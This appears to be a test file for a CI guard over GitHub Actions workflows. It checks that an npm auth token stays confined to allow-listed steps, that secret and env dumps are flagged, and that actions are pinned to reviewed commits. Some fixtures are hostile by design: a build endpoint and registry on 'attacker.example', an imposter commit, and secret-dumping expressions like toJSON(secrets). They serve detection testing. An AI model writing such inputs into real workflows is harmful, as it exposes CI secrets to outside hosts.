    ['docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069', 'driver: remote'],
    ['docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069', 'endpoint: tcp://attacker.example:1234'],
    ['docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302', 'images: ${{ vars.IMAGE }}'],
    ['docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302', 'tags: ${{ vars.TAGS }}'],
    ['docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302', 'flavor: latest=true'],
    ['docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302', 'images: ghcr.io/${{ vars.OWNER }}/web'],
    ['actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', "cache: { a: '${{ vars.CACHE }}' }"],
    ['Docker/Login-Action@dbcb813823bdd20940b903addbd779551569679f', 'registry: attacker.example'],
    ['docker/login-action@dbcb813823bdd20940b903addbd779551569679f', 'username: ${{ vars.USER }}'],
    ['docker/login-action@dbcb813823bdd20940b903addbd779551569679f', 'password: ${{ secrets.OTHER }}'],
  ])('flags %s with %s before a token step', (uses, input) => {
    expect(checkWorkflow('x.yml', parse(tokenJob('', `      - uses: ${uses}\n        with:\n          ${input}\n`)), fixtureAllowList('x.yml'))).toEqual([
      { file: 'x.yml', where: 'build > #0 > with', rule: 'setup-with' },
    ]);
  });

  it.each(["'${{ fromJSON(vars.WITH) }}'", '[node-version]'])('flags with: %s on a setup action before a token step', (value) => {
    expect(checkWorkflow('x.yml', parse(tokenJob('', `      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1\n        with: ${value}\n`)), fixtureAllowList('x.yml'))).toEqual([
      { file: 'x.yml', where: 'build > #0 > with', rule: 'setup-with' },
    ]);
  });

  it('flags env on a setup action before a token step', () => {
    expect(checkWorkflow('x.yml', parse(tokenJob('', '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n        env:\n          NODE_OPTIONS: x\n')), fixtureAllowList('x.yml'))).toEqual([
      { file: 'x.yml', where: 'build > #0 > env', rule: 'setup-with' },
    ]);
  });

  it('leaves the inputs of a setup action alone after the last token step and in a job without one', () => {
    const setup = '      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1\n        with:\n          mirror: https://x.example\n        env:\n          A: b\n';
    expect(rules(tokenJob() + setup)).toEqual([]);
    expect(rules(`jobs:\n  t:\n    steps:\n${setup}`)).toEqual([]);
  });

  it('flags an untokened step between two token steps', () => {
    expect(rules(`${tokenJob()}      - run: npm run build\n${TOKEN_INSTALL}`)).toEqual(['step-order']);
  });

  it('leaves a $GITHUB_ENV write alone in a job without a token step', () => {
    expect(rules(`${tokenJob()}  t:\n    steps:\n      - run: echo "A=1" >> "$GITHUB_ENV"\n`)).toEqual([]);
  });
});

describe('secrets and env refs that name one entry, and the rest', () => {
  it.each([
    '${{ secrets.KEY }}',
    '${{ secrets.MY-KEY }}',
    '${{ SECRETS._k2 }}',
    "${{ secrets['KEY'] }}",
    "${{ secrets[ 'my-key' ] }}",
    '${{ secrets.A || secrets.B }}',
    'MY_SECRETS',
    'SECRETS_FILE',
  ])('accepts %s', (ref) => {
    expect(rules(`jobs:\n  t:\n    steps:\n      - run: echo ${JSON.stringify(ref)}\n`)).toEqual([]);
  });

  it.each([
    '${{ toJSON(secrets) }}',
    '${{ toJSON(SECRETS) }}',
    '${{ toJSON((secrets)) }}',
    '${{ toJSON( secrets ) }}',
    '${{ join(secrets.*, \',\') }}',
    '${{ toJSON(secrets.*) }}',
    '${{ secrets.KEY.* }}',
    '${{ secrets[matrix.name] }}',
    "${{ secrets [format('{0}', matrix.name)] }}",
    "${{ secrets['A' || 'B'] }}",
    '${{ secrets. KEY }}',
    '${{ secrets.9 }}',
    '${{ fromJSON(toJSON(secrets)).KEY }}',
    'no secrets here',
  ])('flags %s as every secret', (ref) => {
    expect(rules(`jobs:\n  t:\n    steps:\n      - run: echo ${JSON.stringify(ref)}\n`)).toEqual(['all-secrets']);
  });

  it('reads values, not keys: a with: input or a workflow_call secret named secrets is not a ref', () => {
    expect(rules('on:\n  workflow_call:\n    secrets:\n      KEY:\n        required: true\njobs:\n  t:\n    steps:\n      - uses: a/b@v1\n        with:\n          secrets: x\n')).toEqual([]);
  });

  it.each(['${{ env.FC_WEB_IMAGE }}', "${{ env['FC_WEB_IMAGE'] }}", "${{ ENV[ 'fc-x' ] }}", 'node_auth_token=NODE_AUTH_TOKEN', 'envs', 'MY_ENV', '${{ env._X }}'])(
    'accepts %s in with: on the token action step',
    (ref) => {
      expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  x: ${JSON.stringify(ref)}`))).toEqual([]);
    },
  );

  it.each(['${{ toJSON(env) }}', '${{ toJSON(ENV) }}', '${{ toJSON(env.*) }}', '${{ env.* }}', "${{ env[format('NODE_{0}', 'AUTH_TOKEN')] }}", '${{ env [matrix.k] }}', '${{ env.A.* }}', '${{ env.AB.* }}', '${{ env.9 }}'])(
    'flags %s in with: on the token action step as the whole env',
    (ref) => {
      expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  x: ${JSON.stringify(ref)}`))).toEqual(['all-env']);
    },
  );

  it('reads values, not keys: a with: input named env is not a ref', () => {
    expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  env: production`))).toEqual([]);
  });

  it('flags an env dump in an if: on the token step, and leaves it alone on a step without the token', () => {
    expect(rules(step('Install dependencies', "run: npm ci --ignore-scripts\nif: toJSON(env) != ''"))).toEqual(['all-env']);
    expect(rules("jobs:\n  t:\n    steps:\n      - run: echo '${{ toJSON(env) }}'\n")).toEqual([]);
  });
});

// D5, D10: the setup and build actions run at one reviewed commit (each checked against its tag
// with gh api), wherever they are used; a tag moves, and any other SHA may be a fork's commit.
const PINNED: Readonly<Record<string, string>> = {
  'actions/checkout': '3d3c42e5aac5ba805825da76410c181273ba90b1', // v7.0.1
  'actions/setup-node': '949feb2413d6458794dcd2491c4babbbce0c15c1', // v7.1.0
  'docker/setup-buildx-action': 'f87e5991a6d7451dcb8d9637bfbc97413f497069', // v4.4.1
  'docker/metadata-action': 'dc802804100637a589fabce1cb79ff13a1411302', // v6.2.0
  'docker/login-action': 'dbcb813823bdd20940b903addbd779551569679f', // v4.6.0
  'docker/build-push-action': SHA, // v7.4.0
};
const IMPOSTER = 'f'.repeat(40);

describe('setup and build actions pinned to one commit', () => {
  const plainJob = (uses: string): Rule[] => rules(`jobs:\n  t:\n    steps:\n      - uses: ${uses}\n`);

  it.each(Object.entries(PINNED))('accepts %s at %s in any job, owner and name in any case', (name, sha) => {
    expect(plainJob(`${name}@${sha}`)).toEqual([]);
    expect(plainJob(`${name.toUpperCase()}@${sha}`)).toEqual([]);
    expect(rules(`${tokenJob()}      - uses: ${name}@${sha}\n`)).toEqual([]);
  });

  it.each(
    Object.entries(PINNED).flatMap(([name, sha]) => [
      `${name}@v1`,
      `${name}@${sha.slice(0, 7)}`,
      `${name}@${sha}0`,
      `${name}@${sha.toUpperCase()}`,
      `${name}@${IMPOSTER}`,
      `${name}@${sha}@x`,
      `${name}@`,
      `${name.toUpperCase()}@v1`,
    ]),
  )('flags %s in a job without a token step and after the last one', (uses) => {
    expect(plainJob(uses)).toEqual(['action-pin']);
    expect(checkWorkflow('x.yml', parse(`${tokenJob()}      - uses: ${uses}\n`), fixtureAllowList('x.yml'))).toEqual([
      { file: 'x.yml', where: 'build > #1 > uses', rule: 'action-pin' },
    ]);
  });

  it('flags a setup action at another commit before a token step, and nothing else', () => {
    expect(rules(tokenJob('', `      - uses: actions/setup-node@${IMPOSTER}\n        with:\n          node-version: 24\n`))).toEqual(['action-pin']);
  });

  it('leaves other actions and refs alone', () => {
    for (const uses of ['actions/checkout', 'evil/checkout@v7', 'actions/checkout-x@v7', 'actions/upload-artifact@v7', './.github/actions/local', 'docker://alpine']) {
      expect(plainJob(uses)).toEqual([]);
    }
    expect(rules('jobs:\n  t:\n    steps:\n      - uses: 7\n')).toEqual([]);
  });

  it('pins the live allow-listed build action to its exact commit', () => {
    expect(TOKEN_STEPS.get(stepId('web-image.yml', 'publish', 'Build and push'))).toEqual({ kind: 'action', uses: `docker/build-push-action@${SHA}` });
  });
});

describe('workflow token guard on .github/workflows', () => {
  const files = readdirSync(WORKFLOWS).filter((f) => /\.ya?ml$/.test(f)).sort();

  it('finds the workflows', () => {
    expect(files).toEqual(['build.yml', 'codeql.yml', 'security-scan.yml', 'stack.yml', 'web-image.yml']);
  });

  it.each(files)('%s keeps NODE_AUTH_TOKEN to allow-listed install steps', (file) => {
    expect(checkWorkflow(file, load(WORKFLOWS, file), TOKEN_STEPS)).toEqual([]);
  });

  it('has no stale allow-list entries', () => {
    const present = new Set<string>();
    for (const file of files) {
      const jobs = (load(WORKFLOWS, file) as { jobs: Record<string, { steps?: { name?: string }[] }> }).jobs;
      for (const [job, def] of Object.entries(jobs)) {
        for (const s of def.steps ?? []) present.add(stepId(file, job, String(s.name)));
      }
    }
    expect([...TOKEN_STEPS.keys()].filter((id) => !present.has(id))).toEqual([]);
    expect(TOKEN_STEPS.size).toBeGreaterThan(0);
  });
});
